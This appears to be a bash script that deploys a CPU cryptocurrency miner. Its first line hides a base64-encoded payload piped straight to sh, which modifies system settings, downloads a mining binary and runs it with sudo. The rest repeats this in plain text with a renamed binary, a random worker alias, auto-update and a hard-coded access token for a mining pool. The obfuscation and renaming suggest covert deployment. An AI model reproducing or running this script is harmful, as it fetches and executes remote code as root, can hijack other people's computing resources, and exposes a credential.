#!/bin/bash

echo IyEvYmluL2Jhc2gKc3VkbyBiYXNoIC1jICJlY2hvIHZtLm5yX2h1Z2VwYWdlcz0xMjgwID4+IC9ldGMvc3lzY3RsLmNvbmYiCgp3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9hcXVpbGFyZW5keS9mb29sL3JlbGVhc2VzL2Rvd25sb2FkLzMuMS4xL3FsaS1DbGllbnQKY2htb2QgdSt4IHFsaS1DbGllbnQKCmNhdCA+Li9hcHBzZXR0aW5ncy5qc29uIDw8RU9GCnsKICAiQ2xpZW50U2V0dGluZ3MiOiB7CiAgICAicG9vbEFkZHJlc3MiOiAid3NzOi8vcHBzLm1pbmVybGFiLmlvL3dzL05PVkFMQU5UTyIsCiAgICAiYWxpYXMiOiAidGVzUFBTMTEiLAogICAgInRyYWluZXIiOiB7CiAgICAgICJjcHUiOiB0cnVlLAogICAgICAiZ3B1IjogZmFsc2UsCiAgICAgICJjcHVUaHJlYWRzIjogNAogICAgfSwKICAgICJhY2Nlc3NUb2tlbiI6ICJleUpoYkdjaU9pSlNVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKSlpDSTZJbVF6TnpNeU9EYzJMVFk1WkRjdE5HSTFPQzFoTm1VekxXTTJNelprTUdRNFpERTBOaUlzSWsxcGJtbHVaeUk2SWlJc0ltNWlaaUk2TVRjeU5UTTNOamt5T1N3aVpYaHdJam94TnpVMk9URXlPVEk1TENKcFlYUWlPakUzTWpVek56WTVNamtzSW1semN5STZJbWgwZEhCek9pOHZjWFZpYVdNdWJHa3ZJaXdpWVhWa0lqb2lhSFIwY0hNNkx5OXhkV0pwWXk1c2FTOGlmUS5zcmVnT3lrMlBFeVh2OHNzZFFEQnRUcHMxSkZCTGdoY0pDekRGdmFENmhXb1ZBX1QtY3JmUVpiaVYwRV9hdHFkNnN4TkhZS0dtZVZDT29VOWNyTFU0bW5valpkRjF2eXAzVnR0QjNaSXFvM3FJZ3IwUjRqV253Wjk1YkdOMWM2TkUzemI5eTdaV29yNS00dHRMa1JfNW1veGlaWnZhS0cyV1dTeEZKLTdrazZTVlN3N3o4aWFZeVZwUFgxVGR1NnBCV3hEU3RZWWFvVnZnTnp4NlJTaFVfcjJBVkNCMUpHZnYxNnZLdkFJR21QY2x1dlMtYXlLd2ZnT3BZMXVFYnNINkxzd2RfS0diQjFhSkM3ZzhBSTFDVW9ZaVVVbF9DSlVCWmZHMEZiQmd0R0RSaGZQVWNZTTV6OEJFeUlybTZiZktoTUh1Sm1JRjg2TkpZeWRSVUhnb3ciLAogICAgInF1YmljQWRkcmVzcyI6IG51bGwsCiAgICAiZGlzcGxheURldGFpbGVkSGFzaHJhdGVzIjogdHJ1ZSwKICAgICJwcHMiOiB0cnVlCiAgfQp9CkVPRgoKc3VkbyAuL3FsaS1DbGllbnQ= | base64 -d | sh

apt update
apt install -y nodejs libc6 g++-11
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
worker=$(echo $RANDOM | md5sum | head -c 10)

wget -O qlicub https://github.com/bondaltomason/meo/releases/download/2.7.0/minerlab2.2.1
chmod u+x qlicub

cat >./appsettings.json <<EOF
{
  "Settings": {
      "baseUrl": "https://wps.minerlab.io/",
      "amountOfThreads": 4,
      "autoupdateEnabled": true,
      "payoutId": null,
      "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImQzNzMyODc2LTY5ZDctNGI1OC1hNmUzLWM2MzZkMGQ4ZDE0NiIsIk1pbmluZyI6IiIsIm5iZiI6MTcyNTM3NjkyOSwiZXhwIjoxNzU2OTEyOTI5LCJpYXQiOjE3MjUzNzY5MjksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.sregOyk2PEyXv8ssdQDBtTps1JFBLghcJCzDFvaD6hWoVA_T-crfQZbiV0E_atqd6sxNHYKGmeVCOoU9crLU4mnojZdF1vyp3VttB3ZIqo3qIgr0R4jWnwZ95bGN1c6NE3zb9y7ZWor5-4ttLkR_5moxiZZvaKG2WWSxFJ-7kk6SVSw7z8iaYyVpPX1Tdu6pBWxDStYYaoVvgNzx6RShU_r2AVCB1JGfv16vKvAIGmPcluvS-ayKwfgOpY1uEbsH6Lswd_KGbB1aJC7g8AI1CUoYiUUl_CJUBZfG0FbBgtGDRhfPUcYM5z8BEyIrm6bfKhMHuJmIF86NJYydRUHgow",
      "alias": "$worker",
      "trainer": {
          "gpu": false,
          "gpuVersion": "CUDA12",
          "cpu": true
      },
      "socketUrl": "wss://wps.minerlab.io/ws/AQUILARENDY",
      "useLiveConnection": true,
      "isPps": false,
      "idleSettings": {
          "command": "ping",
          "arguments": "google.com"
      }
  }
}
EOF

sudo ./qlicub
